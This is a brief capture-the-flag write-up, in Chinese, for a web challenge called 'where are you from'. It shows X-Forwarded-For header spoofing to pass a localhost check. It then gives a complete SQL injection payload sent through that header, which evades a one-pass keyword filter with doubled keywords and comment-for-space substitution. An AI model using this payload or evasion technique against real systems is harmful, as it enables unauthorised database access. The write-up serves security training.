# where are you from  Writeup

## level 1

X-Forwarded-For头设置为127.0.0.1即可。

## level 2

X-Forwarded-For处的注入，过滤了空格和一些关键字，但是关键字只过滤了一次，因此可以双写绕过。最终getflag的payload：

```
X-Forwarded-For: 12',(selselectect/**/fl4g/**/ffromrom/**/flaaag))#
```
